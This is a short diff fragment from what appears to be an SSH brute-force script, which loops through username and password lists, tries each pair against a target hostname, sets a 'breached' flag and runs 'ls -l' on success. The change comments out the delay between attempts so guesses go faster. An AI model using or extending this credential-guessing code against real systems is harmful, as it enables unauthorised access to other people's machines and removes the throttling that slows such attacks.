@@ -47,7 +47,7 @@ def compute(hostname):
                     pwd = pwd_list[i]
                     try:
                         if breached == False:
-                            time.sleep(0.1)
+                            #time.sleep(0.1) # for when SSH connection keeps dropping
                             try:
                                 client.connect(hostname,username=uid,password=pwd)
                                 stdin, stdout, stderr = client.exec_command('ls -l')
